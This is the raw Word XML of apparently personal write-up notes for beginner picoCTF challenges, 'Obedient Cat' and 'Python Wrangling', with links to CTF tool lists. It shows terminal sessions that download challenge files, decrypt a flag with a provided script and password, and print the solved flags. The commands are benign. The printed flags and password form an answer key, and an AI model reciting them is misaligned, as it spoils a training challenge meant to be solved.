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4E87C" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A56">
      <w:r>
        <w:t>CTF TOOLs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A7B204" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00000000" w:rsidP="00517A56">
      <w:hyperlink r:id="rId5" w:history="1">
        <w:r w:rsidR="00517A56" w:rsidRPr="00F80149">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.hucerc.com/recommended-tool-list-for-ctf/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D651C8B" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A56"/>
    <w:p w14:paraId="3B04D936" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00000000" w:rsidP="00517A56">
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r w:rsidR="00517A56" w:rsidRPr="002A12D6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://blogs.nvcc.edu/kdinh/ctftools/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="440DC8DB" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00000000" w:rsidP="00517A56">
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidR="00517A56" w:rsidRPr="00074237">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://resources.infosecinstitute.com/topic/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10750C1B" w14:textId="388DE006" w:rsidR="00F7099E" w:rsidRDefault="00000000" w:rsidP="00F7099E">
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="00517A56" w:rsidRPr="00517A56">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://gchq.github.io/CyberChef/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="504E6EAC" w14:textId="6BF8ABFA" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="3DEA7A73" w14:textId="60068259" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA09F6">
        <w:t>Obedient Cat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306BE900" w14:textId="30F64910" w:rsidR="00F7099E" w:rsidRPr="00F7099E" w:rsidRDefault="00F7099E" w:rsidP="00F7099E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="735DB9DC" wp14:editId="612F5379">
            <wp:extent cx="6332220" cy="419290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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4192905"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B69D8D" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="68BBB623" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04473E80" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t xml:space="preserve">└─$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> https://mercury.picoctf.net/static/217686fc11d733b80be62dcfcfca6c75/flag </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C35698D" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>--2022-08-30 13:07:17--  https://mercury.picoctf.net/static/217686fc11d733b80be62dcfcfca6c75/flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681F10C6" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD371DF" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC427BD" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C35728D" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>Length: 34 [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69784C7C" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>Saving to: ‘flag’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471B12E7" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6"/>
    <w:p w14:paraId="74B10A4C" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t xml:space="preserve">flag                100%[================&gt;]      34  --.-KB/s    in 0s      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E4F268" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6"/>
    <w:p w14:paraId="58344FBB" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>2022-08-30 13:07:17 (32.8 MB/s) - ‘flag’ saved [34/34]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E38B81" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6"/>
    <w:p w14:paraId="596BB425" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EAD8F2" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339165CD" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:r>
        <w:t>└─$ cat flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55084D1C" w14:textId="6BFB318D" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{s4n1ty_v3r1f13d_b5aeb3dd}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF11AEF" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="1833248D" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="1B655887" w14:textId="77777777" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="574E3E78" w14:textId="19FF23A8" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Hlk112749570"/>
      <w:r w:rsidRPr="00BA09F6">
        <w:t>Python Wrangling</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:p w14:paraId="6C07A7EA" w14:textId="54B4DC9C" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00BA09F6">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39802277" wp14:editId="7FCB1025">
            <wp:extent cx="6332220" cy="2748915"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2748915"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB33C88" w14:textId="591FA0E2" w:rsidR="00BA09F6" w:rsidRDefault="00BA09F6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="2D6BDB17" w14:textId="1DC0C4CB" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="3F5460DD" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2314D966" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">└─$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> https://mercury.picoctf.net/static/8e33ede04d02f3765b8c6a6e24d72733/ende.py    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E4F318" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>--2022-08-30 13:09:35--  https://mercury.picoctf.net/static/8e33ede04d02f3765b8c6a6e24d72733/ende.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774EE623" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DFC7D3" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C01ADEA" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5779AFB1" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Length: 1328 (1.3K) [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7255F04A" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Saving to: ‘ende.py’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F042AA" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="4D3A504B" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">ende.py             100%[================&gt;]   1.30K  --.-KB/s    in 0s      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51273399" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="67F35311" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>2022-08-30 13:09:35 (3.09 MB/s) - ‘ende.py’ saved [1328/1328]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC68EE2" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="686480E4" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B1905A" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FBD19F" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">└─$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> https://mercury.picoctf.net/static/8e33ede04d02f3765b8c6a6e24d72733/pw.txt </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A57D3A" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>--2022-08-30 13:11:42--  https://mercury.picoctf.net/static/8e33ede04d02f3765b8c6a6e24d72733/pw.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C20A51" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09127CCD" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254A80DE" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363E878F" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Length: 33 [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E35AA9" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Saving to: ‘pw.txt’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0819B37B" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="5D071DFE" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">pw.txt              100%[================&gt;]      33  --.-KB/s    in 0s      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75168ED5" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="7D72815A" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>2022-08-30 13:11:43 (29.2 MB/s) - ‘pw.txt’ saved [33/33]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD96331" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="2ABF0E44" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77524F86" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC1C3FD" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">└─$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> https://mercury.picoctf.net/static/8e33ede04d02f3765b8c6a6e24d72733/flag.txt.en</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43888193" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>--2022-08-30 13:12:59--  https://mercury.picoctf.net/static/8e33ede04d02f3765b8c6a6e24d72733/flag.txt.en</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DFB4E0" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2AD25D" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D4FD39" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E033977" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Length: 140 [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC06831" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Saving to: ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag.txt.en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C69F11A" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="275328FF" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag.txt.en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">         100%[================&gt;]     140  --.-KB/s    in 0s      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C587B1B" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="297784B1" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>2022-08-30 13:13:00 (62.7 MB/s) - ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag.txt.en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>’ saved [140/140]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692A3185" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="12BAB680" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AC8C9F" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049BAD58" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>└─$ python ende.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6355CCED" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Usage: ende.py (-e/-d) [file]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA396A2" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602C5604" w14:textId="527EC5CA" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FECAFF2" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>└─$ cat pw.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C2A66A" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>aa821c16aa821c16aa821c16aa821c16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B418B8E" w14:textId="2291ADBB" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C93B868" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A161DF5" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t xml:space="preserve">└─$ python ende.py -d </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag.txt.en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6D883856" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:t>Please enter the password:aa821c16aa821c16aa821c16aa821c16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074A6582" w14:textId="1DE63082" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{4p0110_1n_7h3_h0us3_aa821c16}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E44E6F3" w14:textId="745CD530" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="286B7545" w14:textId="3547A760" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Wave a flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18ECD24A" w14:textId="376E1AF6" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A8146BF" wp14:editId="596FF746">
            <wp:extent cx="6332220" cy="2482215"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="52" name="Picture 5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 Teams&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2482215"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="160D23BD" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00BD5D34"/>
    <w:p w14:paraId="3E1A7E5F" w14:textId="196ED336" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
